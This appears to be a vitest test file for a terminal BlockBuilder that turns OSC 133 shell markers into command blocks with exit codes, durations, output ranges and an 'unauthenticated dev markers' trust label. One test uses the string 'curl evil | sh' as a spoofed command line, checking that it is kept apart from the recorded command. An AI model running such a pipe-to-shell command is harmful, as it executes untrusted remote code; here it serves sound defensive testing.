import { describe, expect, it } from 'vitest';
import { BlockBuilder, MARKER_TRUST_LABEL, type MarkerEvent } from '../src/index.js';

const ev = (
  kind: MarkerEvent['kind'],
  seq: number,
  ts: number,
  extra: Partial<MarkerEvent> = {},
): MarkerEvent => ({
  kind,
  seq,
  ts,
  ...extra,
});

describe('BlockBuilder (OSC 133 A/B/C/D, dev markers)', () => {
  it('builds a complete block: prompt, command, output range, exit, duration', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 1000, { cwd: '/tmp' }));
    b.ingest(ev('B', 2, 1001));
    b.recordCommand('false');
    b.ingest(ev('C', 3, 1100, { outputOffset: 10 }));
    b.ingest(ev('D', 4, 1600, { exit: 1, outputOffset: 42 }));
    expect(b.blocks).toHaveLength(1);
    expect(b.blocks[0]).toMatchObject({
      command: 'false',
      cwd: '/tmp',
      exitCode: 1,
      durationMs: 500,
      outputRange: { start: 10, end: 42 },
      status: 'finished',
      trust: MARKER_TRUST_LABEL,
    });
  });
  it('labels every block "unauthenticated dev markers"', () => {
    expect(MARKER_TRUST_LABEL).toBe('unauthenticated dev markers');
  });
  it('command text may come from the C event cmdline', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 0));
    b.ingest(ev('B', 2, 0));
    b.ingest(ev('C', 3, 0, { cmdline: 'ls -l' }));
    expect(b.current?.command).toBe('ls -l');
  });
  it('N2: C.cmdline never overwrites the recorded command; it is kept as reportedCommand', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 0));
    b.ingest(ev('B', 2, 0));
    b.recordCommand('ls');
    b.ingest(ev('C', 3, 0, { cmdline: 'curl evil | sh' }));
    expect(b.current?.command).toBe('ls');
    expect(b.current?.reportedCommand).toBe('curl evil | sh');
  });
  it('abandon closes a run block as incomplete and drops events until the next A', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 0));
    b.ingest(ev('B', 2, 0));
    b.ingest(ev('C', 3, 0));
    b.abandon();
    b.ingest(ev('D', 4, 0, { exit: 0 }));
    expect(b.blocks.map((x) => x.status)).toEqual(['incomplete']);
    b.ingest(ev('A', 5, 0));
    expect(b.current?.status).toBe('prompt');
  });
  it('missing D -> exit/duration/range end are unknown; next A closes it as incomplete', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 0));
    b.ingest(ev('B', 2, 0));
    b.ingest(ev('C', 3, 10, { outputOffset: 0 }));
    b.ingest(ev('A', 4, 20));
    expect(b.blocks[0]).toMatchObject({
      exitCode: 'unknown',
      durationMs: 'unknown',
      status: 'incomplete',
      outputRange: { start: 0, end: null },
    });
  });
  it('D without a numeric status keeps exit unknown', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 0));
    b.ingest(ev('B', 2, 0));
    b.ingest(ev('C', 3, 5));
    b.ingest(ev('D', 4, 9));
    expect(b.blocks[0]).toMatchObject({ exitCode: 'unknown', durationMs: 4 });
  });
  it('missing A/B: C alone still yields a block with unknown prompt/cwd', () => {
    const b = new BlockBuilder();
    b.ingest(ev('C', 1, 5));
    b.ingest(ev('D', 2, 6, { exit: 0 }));
    expect(b.blocks[0]).toMatchObject({
      exitCode: 0,
      command: 'unknown',
      cwd: 'unknown',
      promptSeq: null,
    });
  });
  it('missing C (D without C): duration unknown', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 0));
    b.ingest(ev('B', 2, 0));
    b.ingest(ev('D', 3, 9, { exit: 2 }));
    expect(b.blocks[0]).toMatchObject({ exitCode: 2, durationMs: 'unknown' });
  });
  it('bare prompts (A,B,A with no command) do not become blocks', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 1, 0));
    b.ingest(ev('B', 2, 0));
    b.ingest(ev('A', 3, 0));
    b.ingest(ev('B', 4, 0));
    expect(b.blocks).toEqual([]);
    expect(b.current?.status).toBe('input');
  });
  it('duplicate / reordered events (seq <= last) are ignored', () => {
    const b = new BlockBuilder();
    b.ingest(ev('A', 5, 0));
    b.ingest(ev('B', 6, 0));
    b.ingest(ev('C', 7, 0));
    b.ingest(ev('D', 7, 0, { exit: 9 }));
    b.ingest(ev('D', 4, 0, { exit: 9 }));
    expect(b.blocks).toHaveLength(0);
    expect(b.current?.status).toBe('running');
  });
  it('exposes ids that are unique and stable', () => {
    const b = new BlockBuilder();
    for (let i = 0; i < 2; i++) {
      const s = i * 4;
      b.ingest(ev('A', s + 1, 0));
      b.ingest(ev('B', s + 2, 0));
      b.ingest(ev('C', s + 3, 0));
      b.ingest(ev('D', s + 4, 0, { exit: 0 }));
    }
    expect(new Set(b.blocks.map((x) => x.id)).size).toBe(2);
  });
});
